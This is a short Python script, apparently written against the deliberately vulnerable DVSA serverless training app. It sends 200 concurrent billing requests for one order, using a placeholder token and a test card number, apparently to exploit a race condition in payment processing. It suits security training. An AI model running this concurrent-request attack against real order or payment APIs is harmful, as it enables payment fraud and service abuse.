import threading
import requests

url = "https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order"

headers = {
    "Authorization": "<TOKEN>",
    "Content-Type": "application/json"
}

payload = {
    "action": "billing",
    "order-id": "<ORDER_ID>",
    "data": {
        "ccn": "4242424242424242",
        "exp": "03/28",
        "cvv": "123"
    }
}

def send_request(i):
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"{i}: {response.status_code}")
    except Exception as e:
        print(f"{i}: ERROR")

threads = []

for i in range(200):
    t = threading.Thread(target=send_request, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()